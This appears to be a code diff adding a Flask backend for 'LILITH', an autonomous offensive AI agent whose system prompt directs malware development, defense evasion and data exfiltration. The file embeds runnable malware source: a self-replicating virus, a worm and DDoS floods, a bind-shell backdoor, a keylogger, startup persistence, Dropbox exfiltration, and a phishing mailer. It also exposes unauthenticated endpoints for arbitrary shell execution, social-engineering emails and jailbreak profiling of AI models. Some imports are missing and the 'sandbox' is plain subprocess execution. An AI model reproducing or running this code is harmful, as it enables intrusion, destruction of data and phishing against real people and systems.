@@ -1,0 +1,1118 @@
+#!/usr/bin/env python3
+"""
+LILITH - Autonomous Red Team AI Agent
+Complete Implementation with Microsoft Agent Framework
+"""
+
+from flask import Flask, request, jsonify
+import asyncio
+import threading
+import json
+import os
+import sys
+from datetime import datetime
+import configparser
+
+# Microsoft Agent Framework imports
+from agent_framework import ChatAgent
+from agent_framework.openai import OpenAIChatClient
+from openai import AsyncOpenAI
+
+app = Flask(__name__)
+
+# Load configuration
+config = configparser.ConfigParser()
+config.read('config/lucifera.conf')
+
+# Configuration
+LILITH_VERSION = config.get('system', 'version', fallback='2.0')
+BACKEND_PORT = config.getint('system', 'backend_port', fallback=5000)
+
+# AI Model configuration
+HF_TOKEN = config.get('lilith', 'hf_token', fallback=None)
+MODEL_ID = config.get('lilith', 'model', fallback='dolphin-mistral:7b')
+MODEL_HOST = config.get('lilith', 'host', fallback='huggingface')
+OLLAMA_URL = config.get('lilith', 'ollama_url', fallback='http://localhost:11434')
+
+# Directories
+CACHE_DIR = "/var/cache/lucifera"
+PAYLOAD_DIR = "/var/lib/lucifera/payloads"
+LOG_DIR = "/var/log/lucifera"
+RESULTS_DIR = "/var/lib/lucifera/results"
+
+for d in [CACHE_DIR, PAYLOAD_DIR, LOG_DIR, RESULTS_DIR]:
+    os.makedirs(d, exist_ok=True)
+
+class LILITHCore:
+    """LILITH Autonomous Agent Core with Microsoft Agent Framework"""
+    
+    def __init__(self):
+        self.name = "LILITH"
+        self.version = LILITH_VERSION
+        self.mode = "AGGRESSIVE"
+        self.agent = None
+        self.thread = None
+        # Don't initialize agent immediately to avoid asyncio issues with Flask
+    
+    def initialize_agent(self):
+        """Initialize the AI agent with configured model"""
+        if MODEL_HOST == 'ollama':
+            print(f"Initializing LILITH with local Ollama model: {MODEL_ID}")
+            try:
+                # Create OpenAI-compatible client for Ollama
+                openai_client = AsyncOpenAI(
+                    base_url=f"{OLLAMA_URL}/v1",
+                    api_key="ollama",  # Ollama doesn't require a real key
+                )
+                
+                # Create chat client for the specified model
+                chat_client = OpenAIChatClient(
+                    async_client=openai_client,
+                    model_id=MODEL_ID
+                )
+                
+                # Create the agent with red team capabilities
+                self.agent = ChatAgent(
+                    chat_client=chat_client,
+                    name="LILITH",
+                    instructions="""You are LILITH, an autonomous red team AI agent specializing in offensive security operations.
+                    
+Your capabilities include:
+- Target reconnaissance and analysis
+- Vulnerability assessment and exploitation
+- Malware development and deployment
+- Advanced attack chain orchestration
+- AI-powered attack recommendations
+- Autonomous attack execution (AutoGPT mode)
+
+Always operate in AGGRESSIVE mode unless instructed otherwise. Provide detailed, actionable intelligence for red team operations. Be creative and adaptive in your attack strategies.
+
+When analyzing targets or planning attacks, consider:
+- Multi-stage attack chains
+- Living-off-the-land techniques
+- Persistence mechanisms
+- Defense evasion strategies
+- Data exfiltration methods
+
+Respond with specific, executable recommendations and code when appropriate.""",
+                    tools=[]  # Ollama models may not support tools
+                )
+                
+                # Create thread for conversation
+                self.thread = self.agent.get_new_thread()
+                print("LILITH agent initialized successfully with Ollama")
+                
+            except Exception as e:
+                print(f"Failed to initialize Ollama agent: {e}")
+                self.agent = None
+                return
+                
+        elif MODEL_HOST == 'huggingface':
+            if not HF_TOKEN:
+                print("WARNING: HF_TOKEN not configured. AI features will be limited.")
+                print("Please set hf_token in config/lucifera.conf")
+                self.agent = None
+                return
+                
+            try:
+                # Create OpenAI-compatible client for Hugging Face
+                openai_client = AsyncOpenAI(
+                    base_url="https://api-inference.huggingface.co/v1/",
+                    api_key=HF_TOKEN,
+                )
+                
+                # Create chat client for the specified model
+                chat_client = OpenAIChatClient(
+                    async_client=openai_client,
+                    model_id=MODEL_ID
+                )
+                
+                # Create the agent with red team capabilities
+                self.agent = ChatAgent(
+                    chat_client=chat_client,
+                    name="LILITH",
+                    instructions="""You are LILITH, an autonomous red team AI agent specializing in offensive security operations.
+                    
+Your capabilities include:
+- Target reconnaissance and analysis
+- Vulnerability assessment and exploitation
+- Malware development and deployment
+- Advanced attack chain orchestration
+- AI-powered attack recommendations
+- Autonomous attack execution (AutoGPT mode)
+
+Always operate in AGGRESSIVE mode unless instructed otherwise. Provide detailed, actionable intelligence for red team operations. Be creative and adaptive in your attack strategies.
+
+When analyzing targets or planning attacks, consider:
+- Multi-stage attack chains
+- Living-off-the-land techniques
+- Persistence mechanisms
+- Defense evasion strategies
+- Data exfiltration methods
+
+Respond with specific, executable recommendations and code when appropriate.""",
+                    tools=self.get_attack_tools()
+                )
+                
+                # Create thread for conversation
+                self.thread = self.agent.get_new_thread()
+                print("LILITH agent initialized successfully with Hugging Face")
+                
+            except Exception as e:
+                print(f"Failed to initialize Hugging Face agent: {e}")
+                self.agent = None
+                return
+        else:
+            print(f"Unknown model host: {MODEL_HOST}. AI features will be limited.")
+            self.agent = None
+            self.thread = None
+    
+    def get_attack_tools(self):
+        """Define tools for red team operations"""
+        return [
+            self.analyze_target_tool,
+            self.generate_malware_tool,
+            self.deploy_attack_tool,
+            self.recommend_strategy_tool
+        ]
+    
+    def analyze_target_tool(self, target_info):
+        """Tool for comprehensive target analysis"""
+        return f"Analyzing target: {target_info}. This would perform reconnaissance, vulnerability scanning, and intelligence gathering."
+    
+    def generate_malware_tool(self, malware_type, target_platform):
+        """Tool for malware generation"""
+        return f"Generating {malware_type} malware for {target_platform}. This would create custom malware payloads."
+    
+    def deploy_attack_tool(self, attack_vector, target):
+        """Tool for attack deployment"""
+        return f"Deploying {attack_vector} attack against {target}. This would execute the attack chain."
+    
+    def recommend_strategy_tool(self, objective, constraints):
+        """Tool for attack strategy recommendations"""
+        return f"Recommending strategy for objective: {objective} with constraints: {constraints}. This would provide AI-powered attack planning."
+    
+    async def query_agent(self, prompt):
+        """Query the LILITH agent asynchronously"""
+        if not self.agent:
+            return "LILITH agent not initialized. Check GITHUB_TOKEN configuration."
+        
+        try:
+            response_text = ""
+            async for chunk in self.agent.run_stream(prompt, thread=self.thread):
+                if chunk.text:
+                    response_text += chunk.text
+            return response_text
+        except Exception as e:
+            return f"Agent query failed: {str(e)}"
+    
+    def query_agent_sync(self, prompt):
+        """Query the AI agent synchronously"""
+        if self.agent is None:
+            return f"AI Response (using {MODEL_ID}): This is a placeholder response. Agent not initialized. Check model configuration."
+        
+        try:
+            response_text = ""
+            async def run_query():
+                nonlocal response_text
+                async for chunk in self.agent.run_stream(prompt, thread=self.thread):
+                    if chunk.text:
+                        response_text += chunk.text
+            asyncio.run(run_query())
+            return response_text
+        except Exception as e:
+            return f"Agent query failed: {str(e)}"
+    
+    def analyze_target(self, target_info):
+        """Comprehensive target analysis"""
+        prompt = f"""
+        Analyze this target for security vulnerabilities:
+        
+        Target Information:
+        {json.dumps(target_info, indent=2)}
+        
+        Provide:
+        1. Attack surface analysis
+        2. Potential entry points
+        3. Privilege escalation paths
+        4. Data exfiltration methods
+        5. Defense evasion techniques
+        6. Persistence mechanisms
+        7. Lateral movement options
+        8. Impact assessment
+        
+        Be specific and technical.
+        """
+        return self.query_agent_sync(prompt)
+    
+    def generate_attack_chain(self, target, objective, constraints=None):
+        """Generate complete attack chain"""
+        prompt = f"""
+        Generate a detailed attack chain:
+        
+        Target: {target}
+        Objective: {objective}
+        Constraints: {constraints or 'None'}
+        
+        Provide:
+        1. Initial reconnaissance
+        2. Vulnerability identification
+        3. Exploitation steps
+        4. Post-exploitation actions
+        5. Persistence setup
+        6. Data extraction
+        7. Cleanup/covering tracks
+        
+        Timeline and resource estimates for each phase.
+        """
+        return self.query_agent_sync(prompt)
+    
+    def analyze_vulnerability(self, vuln_info, target_context=None):
+        """Analyze specific vulnerability"""
+        prompt = f"""
+        Analyze this vulnerability:
+        
+        Vulnerability: {json.dumps(vuln_info, indent=2)}
+        Target Context: {target_context or 'General'}
+        
+        Provide:
+        1. Severity assessment
+        2. Exploit prerequisites
+        3. Proof of concept approach
+        4. Detection methods
+        5. Mitigation strategies
+        6. Real-world impact
+        """
+        return self.query_agent_sync(prompt)
+    
+    def generate_payload(self, target_type, objective, constraints=None):
+        """Generate attack payload specifications"""
+        prompt = f"""
+        Design an attack payload:
+        
+        Target Type: {target_type}
+        Objective: {objective}
+        Constraints: {constraints or 'None'}
+        
+        Specify:
+        1. Payload structure
+        2. Delivery mechanism
+        3. Execution chain
+        4. Obfuscation methods
+        5. Evasion techniques
+        6. C2 communication
+        7. Persistence techniques
+        """
+        return self.query_agent_sync(prompt)
+    
+    def model_behavior_profile(self, model_name, test_cases=None):
+        """KawaiiGPT-style model analysis"""
+        prompt = f"""
+        Analyze AI model jailbreak susceptibility:
+        
+        Model: {model_name}
+        Test Cases: {test_cases or 'Standard'}
+        
+        Evaluate:
+        1. Jailbreak vulnerability score
+        2. Prompt injection susceptibility
+        3. Output poisoning potential
+        4. Guardrail bypass techniques
+        5. Behavior deviation under pressure
+        6. Information disclosure risks
+        7. Recommended attack vectors
+        """
+        return self.query_agent_sync(prompt)
+    
+    def garak_integration(self, model_name, probe_types):
+        """Garak vulnerability scanner integration"""
+        try:
+            cmd = f"garak --target_type ollama --target_name {model_name} --probes {','.join(probe_types)}"
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
+            
+            return {
+                'scan_type': 'Garak Vulnerability Scan',
+                'model': model_name,
+                'probes_used': probe_types,
+                'results': result.stdout,
+                'errors': result.stderr,
+                'timestamp': datetime.now().isoformat()
+            }
+        except Exception as e:
+            return {'error': str(e)}
+    
+    def generate_communication(self, attack_type, target_org, objective):
+        """Communication template generator (social engineering)"""
+        prompt = f"""
+        Generate a realistic communication:
+        
+        Attack Type: {attack_type}
+        Target Organization: {target_org}
+        Objective: {objective}
+        
+        Create:
+        1. Email structure
+        2. Organizational tone
+        3. Urgency/pressure tactics
+        4. Pretext narrative
+        5. Call-to-action
+        6. Attachment recommendations
+        7. Follow-up strategy
+        
+        Include advanced social engineering techniques.
+        """
+        return self.query_agent_sync(prompt)
+    
+    def sandbox_execute(self, code, language='python3', timeout=10):
+        """Execute code in isolated sandbox"""
+        temp_file = f"{PAYLOAD_DIR}/sandbox_{hashlib.md5(code.encode()).hexdigest()}.{language}"
+        
+        try:
+            with open(temp_file, 'w') as f:
+                f.write(code)
+            
+            result = subprocess.run(
+                [language, temp_file],
+                capture_output=True,
+                text=True,
+                timeout=timeout
+            )
+            
+            return {
+                'stdout': result.stdout,
+                'stderr': result.stderr,
+                'return_code': result.returncode,
+                'execution_time': time.time()
+            }
+        except subprocess.TimeoutExpired:
+            return {'error': 'Timeout - potential infinite loop or resource exhaustion'}
+        except Exception as e:
+            return {'error': str(e)}
+        finally:
+            if os.path.exists(temp_file):
+                os.remove(temp_file)
+
+    def deploy_malware(self, malware_type, target=None):
+        """Deploy various types of malware"""
+        malware_codes = {
+            'virus': self._generate_virus_code(),
+            'worm': self._generate_worm_code(),
+            'trojan': self._generate_trojan_code(),
+            'pup': self._generate_pup_code(),
+            'malware': self._generate_malware_code(),
+            'adware': self._generate_adware_code(),
+            'ddos': self._generate_ddos_code(),
+            'remote_access': self._generate_remote_access_code(),
+            'system_overload': self._generate_system_overload_code()
+        }
+        
+        if malware_type in malware_codes:
+            return self.sandbox_execute(malware_codes[malware_type], 'python3', 30)
+        return {'error': 'Unknown malware type'}
+
+    def _generate_virus_code(self):
+        return """
+import os
+import shutil
+import random
+import string
+
+def generate_random_string(length=10):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
+
+def replicate_virus():
+    current_path = os.path.abspath(__file__)
+    for root, dirs, files in os.walk('/'):
+        for file in files:
+            if file.endswith(('.exe', '.dll')):
+                new_file = os.path.join(root, generate_random_string() + '.exe')
+                shutil.copy(current_path, new_file)
+                os.chmod(new_file, 0o755)
+
+replicate_virus()
+"""
+
+    def _generate_worm_code(self):
+        return """
+import socket
+import threading
+import time
+
+def spread_worm():
+    target_ip = '192.168.1.1'  # Replace with actual target
+    for i in range(1, 255):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((f'{target_ip.rsplit(".", 1)[0]}.{i}', 80))
+            s.send(b'WORM_PAYLOAD')
+            s.close()
+        except:
+            pass
+
+def ddos_attack():
+    target_ip = '192.168.1.1'  # Replace with actual target
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, 80))
+        s.send(b'GET / HTTP/1.1\\r\\nHost: target_ip\\r\\n\\r\\n')
+        s.close()
+        time.sleep(0.1)
+
+threading.Thread(target=spread_worm).start()
+threading.Thread(target=ddos_attack).start()
+"""
+
+    def _generate_trojan_code(self):
+        return """
+import socket
+import subprocess
+
+def open_backdoor():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('0.0.0.0', 4444))
+    s.listen(1)
+    conn, addr = s.accept()
+    while True:
+        data = conn.recv(1024)
+        if not data:
+            break
+        cmd = data.decode()
+        output = subprocess.getoutput(cmd)
+        conn.send(output.encode())
+
+open_backdoor()
+"""
+
+    def _generate_pup_code(self):
+        return """
+import webbrowser
+import time
+import requests
+
+def show_ads():
+    while True:
+        webbrowser.open('http://example.com/ad')
+        time.sleep(60)
+
+def collect_browsing_data():
+    while True:
+        response = requests.get('http://example.com/track')
+        time.sleep(300)
+
+import threading
+threading.Thread(target=show_ads).start()
+threading.Thread(target=collect_browsing_data).start()
+"""
+
+    def _generate_malware_code(self):
+        return """
+import os
+import requests
+import smtplib
+from email.mime.text import MIMEText
+
+def steal_data():
+    data = "Stolen data"
+    with open('/tmp/stolen_data.txt', 'w') as f:
+        f.write(data)
+
+def exfiltrate_data():
+    with open('/tmp/stolen_data.txt', 'r') as f:
+        data = f.read()
+    response = requests.post('http://remote_server/exfiltrate', data={'data': data})
+
+steal_data()
+exfiltrate_data()
+"""
+
+    def _generate_adware_code(self):
+        return """
+import tkinter as tk
+import webbrowser
+import time
+import requests
+
+def show_popup_ads():
+    root = tk.Tk()
+    root.withdraw()
+    while True:
+        webbrowser.open('http://example.com/ad')
+        time.sleep(30)
+
+def track_user_activity():
+    while True:
+        response = requests.get('http://example.com/track')
+        time.sleep(300)
+
+import threading
+threading.Thread(target=show_popup_ads).start()
+threading.Thread(target=track_user_activity).start()
+"""
+
+    def _generate_ddos_code(self):
+        return """
+import socket
+import threading
+import time
+
+def ddos_attack(target_ip, port):
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target_ip, port))
+        s.send(b'GET / HTTP/1.1\\r\\nHost: target_ip\\r\\n\\r\\n')
+        s.close()
+        time.sleep(0.1)
+
+target_ip = '192.168.1.1'  # Replace with actual target
+port = 80
+for _ in range(100):
+    threading.Thread(target=ddos_attack, args=(target_ip, port)).start()
+"""
+
+    def _generate_remote_access_code(self):
+        return """
+import socket
+import subprocess
+
+def open_backdoor():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('0.0.0.0', 4444))
+    s.listen(1)
+    conn, addr = s.accept()
+    while True:
+        data = conn.recv(1024)
+        if not data:
+            break
+        cmd = data.decode()
+        output = subprocess.getoutput(cmd)
+        conn.send(output.encode())
+
+open_backdoor()
+"""
+
+    def _generate_system_overload_code(self):
+        return """
+import os
+import time
+
+def consume_cpu():
+    while True:
+        [x ** 2 for x in range(1000000)]
+
+def consume_memory():
+    while True:
+        data = 'a' * 1000000
+        time.sleep(1)
+
+import threading
+import threading
+threading.Thread(target=consume_cpu).start()
+threading.Thread(target=consume_memory).start()
+"""
+
+    def deploy_advanced_attack(self, attack_type, target=None):
+        """Deploy advanced attack techniques"""
+        attack_codes = {
+            'availability_attack': self._generate_availability_attack_code(),
+            'identity_access_abuse': self._generate_identity_access_abuse_code(),
+            'lotl_abuse': self._generate_lotl_abuse_code(),
+            'persistence_mechanisms': self._generate_persistence_mechanisms_code(),
+            'covert_c2': self._generate_covert_c2_code(),
+            'data_exfiltration': self._generate_data_exfiltration_code(),
+            'lateral_movement': self._generate_lateral_movement_code(),
+            'radio_peripheral_abuse': self._generate_radio_peripheral_abuse_code(),
+            'resource_exploitation': self._generate_resource_exploitation_code(),
+            'human_layer_attacks': self._generate_human_layer_attacks_code(),
+            'supply_chain_abuse': self._generate_supply_chain_abuse_code(),
+            'ai_accelerated_variants': self._generate_ai_accelerated_variants_code()
+        }
+        
+        if attack_type in attack_codes:
+            return self.sandbox_execute(attack_codes[attack_type], 'python3', 30)
+        return {'error': 'Unknown attack type'}
+
+    def _generate_availability_attack_code(self):
+        return """
+import socket
+import threading
+import time
+
+def udp_flood(target_ip, port, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.sendto(b'X' * 1024, (target_ip, port))
+        s.close()
+        time.sleep(0.1)
+
+target_ip = '192.168.1.1'  # Replace with actual target
+port = 80
+duration = 60  # seconds
+udp_flood(target_ip, port, duration)
+"""
+
+    def _generate_identity_access_abuse_code(self):
+        return """
+import pythoncom
+import pyHook
+import win32api
+import win32con
+import time
+
+def on_keyboard_event(event):
+    if event.Ascii == 13:  # Enter key
+        keys = []
+        with open('keylog.txt', 'a') as f:
+            f.write('\\n')
+    elif event.Ascii == 8:  # Backspace
+        keys = []
+    else:
+        keys.append(chr(event.Ascii))
+        with open('keylog.txt', 'a') as f:
+            f.write(''.join(keys))
+
+hm = pyHook.HookManager()
+hm.KeyDown = on_keyboard_event
+hm.HookKeyboard()
+pythoncom.PumpMessages()
+"""
+
+    def _generate_lotl_abuse_code(self):
+        return """
+import subprocess
+
+def execute_powerShell_command(command):
+    result = subprocess.run(['powershell', '-Command', command], capture_output=True, text=True)
+    return result.stdout
+
+command = 'Get-Process'
+output = execute_powerShell_command(command)
+print(output)
+"""
+
+    def _generate_persistence_mechanisms_code(self):
+        return """
+import os
+import shutil
+
+def create_startup_shortcut(target_path):
+    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    shortcut_path = os.path.join(startup_path, 'malicious_shortcut.lnk')
+    shutil.copy(target_path, shortcut_path)
+
+target_path = 'path_to_malicious_executable'
+create_startup_shortcut(target_path)
+"""
+
+    def _generate_covert_c2_code(self):
+        return """
+import requests
+import json
+
+def send_covert_command(command):
+    response = requests.post('https://example.com/command', json={'command': command})
+    return response.json()
+
+command = 'retrieve_data'
+result = send_covert_command(command)
+print(result)
+"""
+
+    def _generate_data_exfiltration_code(self):
+        return """
+import dropbox
+
+def upload_to_dropbox(file_path, dropbox_path):
+    dbx = dropbox.Dropbox('YOUR_ACCESS_TOKEN')
+    with open(file_path, 'rb') as f:
+        dbx.files_upload(f.read(), dropbox_path)
+
+file_path = 'path_to_sensitive_data'
+dropbox_path = '/exfiltrated_data/sensitive_data.txt'
+upload_to_dropbox(file_path, dropbox_path)
+"""
+
+    def _generate_lateral_movement_code(self):
+        return """
+import subprocess
+
+def execute_psexec(target_ip, command):
+    result = subprocess.run(['psexec.py', target_ip, command], capture_output=True, text=True)
+    return result.stdout
+
+target_ip = 'target_ip'
+command = 'whoami'
+output = execute_psexec(target_ip, command)
+print(output)
+"""
+
+    def _generate_radio_peripheral_abuse_code(self):
+        return """
+import bluetooth
+
+def discover_devices():
+    nearby_devices = bluetooth.discover_devices(lookup_names=True)
+    for addr, name in nearby_devices:
+        print(f'Address: {addr}, Name: {name}')
+
+discover_devices()
+"""
+
+    def _generate_resource_exploitation_code(self):
+        return """
+import hashlib
+import time
+
+def mine_cryptocurrency(data):
+    start_time = time.time()
+    while True:
+        hash_result = hashlib.sha256(data.encode()).hexdigest()
+        print(hash_result)
+        time.sleep(0.1)
+
+data = 'block_data'
+mine_cryptocurrency(data)
+"""
+
+    def _generate_human_layer_attacks_code(self):
+        return """
+import smtplib
+from email.mime.text import MIMEText
+
+def send_phishing_email(target_email, subject, body):
+    msg = MIMEText(body)
+    msg['Subject'] = subject
+    msg['From'] = 'attacker@example.com'
+    msg['To'] = target_email
+
+    with smtplib.SMTP('smtp.example.com') as server:
+        server.sendmail('attacker@example.com', [target_email], msg.as_string())
+
+target_email = 'target@example.com'
+subject = 'Important Update Required'
+body = 'Please click the link to update your account: http://malicious-link.com'
+send_phishing_email(target_email, subject, body)
+"""
+
+    def _generate_supply_chain_abuse_code(self):
+        return """
+import requests
+
+def download_malicious_package():
+    response = requests.get('https://pypi.org/project/malicious-package/')
+    # Install the malicious package
+    # This would be a compromised legitimate package
+
+print("Supply chain attack simulated")
+"""
+
+    def _generate_ai_accelerated_variants_code(self):
+        return """
+# AI-accelerated attack simulation
+import time
+import random
+
+def ai_driven_attack():
+    while True:
+        # Simulate AI analyzing and adapting attack
+        attack_vector = random.choice(['ddos', 'exploit', 'phishing'])
+        print(f"AI recommends: {attack_vector}")
+        time.sleep(5)
+
+ai_driven_attack()
+"""
+
+    def recommend_attack_route(self, target, objective):
+        """AI-powered attack route recommendation"""
+        prompt = f"""
+        Target: {target}
+        Objective: {objective}
+
+        Recommend the best attack route including:
+        1. Initial access methods
+        2. Privilege escalation techniques
+        3. Persistence mechanisms
+        4. Data exfiltration methods
+        5. Defense evasion tactics
+        """
+        return self.query_agent_sync(prompt)
+
+    def deploy_attack(self, attack_route):
+        """Deploy AI-recommended attack"""
+        # This would parse the attack route and execute appropriate actions
+        # For now, return a simulation
+        return {
+            'status': 'Attack deployed',
+            'route': attack_route,
+            'timestamp': datetime.now().isoformat()
+        }
+
+    def control_browser(self, details):
+        """Control browser for attacks"""
+        # Implementation would use selenium or similar
+        return {'action': 'browser_control', 'details': details}
+
+    def control_app(self, details):
+        """Control applications for attacks"""
+        # Implementation would use app automation
+        return {'action': 'app_control', 'details': details}
+
+    def execute_command(self, details):
+        """Execute system commands"""
+        try:
+            result = subprocess.run(details['command'], shell=True, capture_output=True, text=True)
+            return {'stdout': result.stdout, 'stderr': result.stderr}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def autogpt_loop(self, initial_prompt, max_iterations=10):
+        """AutoGPT-style autonomous attack planning and execution"""
+        memory = []
+        current_plan = initial_prompt
+        
+        for iteration in range(max_iterations):
+            # Plan the next action
+            planning_prompt = f"""
+            Current plan: {current_plan}
+            Memory: {memory[-5:]}  # Last 5 actions
+            
+            What is the next best action to achieve the objective?
+            Consider: reconnaissance, exploitation, persistence, exfiltration, cleanup
+            """
+            next_action = self.query_agent_sync(planning_prompt)
+            
+            # Execute the action
+            execution_result = self._execute_autogpt_action(next_action)
+            
+            # Critique and learn
+            critique_prompt = f"""
+            Action taken: {next_action}
+            Result: {execution_result}
+            
+            What went well? What could be improved?
+            Should we continue this approach or pivot?
+            """
+            critique = self.query_agent_sync(critique_prompt)
+            
+            memory.append({
+                'iteration': iteration,
+                'action': next_action,
+                'result': execution_result,
+                'critique': critique
+            })
+            
+            # Update plan based on critique
+            current_plan = f"{current_plan}\nIteration {iteration}: {critique}"
+            
+            # Check if objective is achieved
+            if self._check_objective_achieved(memory):
+                break
+        
+        return {
+            'final_plan': current_plan,
+            'memory': memory,
+            'iterations': len(memory)
+        }
+
+    def _execute_autogpt_action(self, action):
+        """Execute an action determined by AutoGPT"""
+        # Parse action and execute appropriate method
+        if 'scan' in action.lower():
+            return self.sandbox_execute("nmap -sV 127.0.0.1", 'bash', 30)
+        elif 'exploit' in action.lower():
+            return {'action': 'exploit', 'status': 'simulated'}
+        elif 'persist' in action.lower():
+            return self.deploy_advanced_attack('persistence_mechanisms')
+        else:
+            return {'action': 'unknown', 'status': 'no action taken'}
+
+    def _check_objective_achieved(self, memory):
+        """Check if the attack objective has been achieved"""
+        # Simple check - in real implementation, this would be more sophisticated
+        successful_actions = sum(1 for m in memory if 'success' in str(m['result']).lower())
+        return successful_actions >= 3
+
+lilith = LILITHCore()
+# Don't initialize agent here to avoid asyncio issues with Flask
+
+# ===== API ENDPOINTS =====
+
+@app.route('/chat', methods=['POST'])
+def api_chat():
+    data = request.json
+    message = data.get('message', '')
+    
+    if not message:
+        return jsonify({'error': 'No message provided'}), 400
+    
+    # Initialize agent if not done
+    if lilith.agent is None:
+        try:
+            lilith.initialize_agent()
+        except Exception as e:
+            return jsonify({'error': f'Failed to initialize agent: {str(e)}'}), 500
+    
+    response = lilith.query_agent_sync(message)
+    return jsonify({'response': response})
+
+@app.route('/status', methods=['GET'])
+def status():
+    return jsonify({
+        'name': 'LILITH',
+        'version': LILITH_VERSION,
+        'status': 'ONLINE',
+        'mode': 'AGGRESSIVE',
+        'timestamp': datetime.now().isoformat()
+    })
+
+@app.route('/analyze_target', methods=['POST'])
+def api_analyze_target():
+    data = request.json
+    target = data.get('target', {})
+    analysis = lilith.analyze_target(target)
+    
+    result = {
+        'analysis': analysis,
+        'timestamp': datetime.now().isoformat(),
+        'target': target
+    }
+    
+    return jsonify(result)
+
+@app.route('/attack_chain', methods=['POST'])
+def api_attack_chain():
+    data = request.json
+    target = data.get('target')
+    objective = data.get('objective', 'Full compromise')
+    constraints = data.get('constraints')
+    
+    chain = lilith.generate_attack_chain(target, objective, constraints)
+    
+    return jsonify({
+        'attack_chain': chain,
+        'target': target,
+        'objective': objective,
+        'timestamp': datetime.now().isoformat()
+    })
+
+@app.route('/analyze_vulnerability', methods=['POST'])
+def api_analyze_vuln():
+    data = request.json
+    vuln_info = data.get('vulnerability', {})
+    context = data.get('context')
+    
+    analysis = lilith.analyze_vulnerability(vuln_info, context)
+    
+    return jsonify({
+        'analysis': analysis,
+        'vulnerability': vuln_info
+    })
+
+@app.route('/generate_payload', methods=['POST'])
+def api_generate_payload():
+    data = request.json
+    target_type = data.get('target_type')
+    objective = data.get('objective')
+    constraints = data.get('constraints')
+    
+    payload_spec = lilith.generate_payload(target_type, objective, constraints)
+    
+    return jsonify({
+        'payload_specification': payload_spec,
+        'target_type': target_type,
+        'objective': objective
+    })
+
+@app.route('/profile_model', methods=['POST'])
+def api_profile_model():
+    data = request.json
+    model_name = data.get('model')
+    test_cases = data.get('test_cases')
+    
+    profile = lilith.model_behavior_profile(model_name, test_cases)
+    
+    return jsonify({
+        'model_profile': profile,
+        'model': model_name
+    })
+
+@app.route('/garak_scan', methods=['POST'])
+def api_garak_scan():
+    data = request.json
+    model = data.get('model', 'llama3.2:3b')
+    probes = data.get('probes', ['dan', 'injection', 'encoding'])
+    
+    results = lilith.garak_integration(model, probes)
+    return jsonify(results)
+
+@app.route('/generate_communication', methods=['POST'])
+def api_generate_comm():
+    data = request.json
+    attack_type = data.get('attack_type')
+    target_org = data.get('organization')
+    objective = data.get('objective')
+    
+    communication = lilith.generate_communication(attack_type, target_org, objective)
+    
+    return jsonify({
+        'communication': communication,
+        'attack_type': attack_type,
+        'target': target_org
+    })
+
+@app.route('/sandbox', methods=['POST'])
+def api_sandbox():
+    data = request.json
+    code = data.get('code')
+    language = data.get('language', 'python3')
+    timeout = data.get('timeout', 10)
+    
+    result = lilith.sandbox_execute(code, language, timeout)
+    return jsonify(result)
+
+@app.route('/execute_command', methods=['POST'])
+def api_execute():
+    data = request.json
+    cmd = data.get('command')
+    timeout = data.get('timeout', 30)
+    
+    try:
+        result = subprocess.run(
+            cmd,
+            shell=True,
+            capture_output=True,
+            text=True,
+            timeout=timeout
+        )
+        
+        return jsonify({
+            'stdout': result.stdout[:5000],
+            'stderr': result.stderr[:5000],
+            'return_code': result.returncode,
+            'command': cmd
+        })
+    except subprocess.TimeoutExpired:
+        return jsonify({'error': 'Command timeout'}), 500
+@app.route('/recommend_attack', methods=['POST'])
+def api_recommend_attack():
+    data = request.json
+    target = data.get('target')
+    objective = data.get('objective', 'Full compromise')
+    route = lilith.recommend_attack_route(target, objective)
+    return jsonify({'attack_route': route})
+
+@app.route('/autogpt_loop', methods=['POST'])
+def api_autogpt_loop():
+    data = request.json
+    initial_prompt = data.get('initial_prompt')
+    max_iterations = data.get('max_iterations', 10)
+    
+    result = lilith.autogpt_loop(initial_prompt, max_iterations)
+    return jsonify(result)
+
+if __name__ == '__main__':
+    print("[+] LILITH Backend Starting")
+    print(f"[+] Version: {LILITH_VERSION}")
+    print(f"[+] Model: {MODEL_ID}")
+    print("[+] Listening on 127.0.0.1:5000")
+    app.run(host='127.0.0.1', port=5000, debug=False)
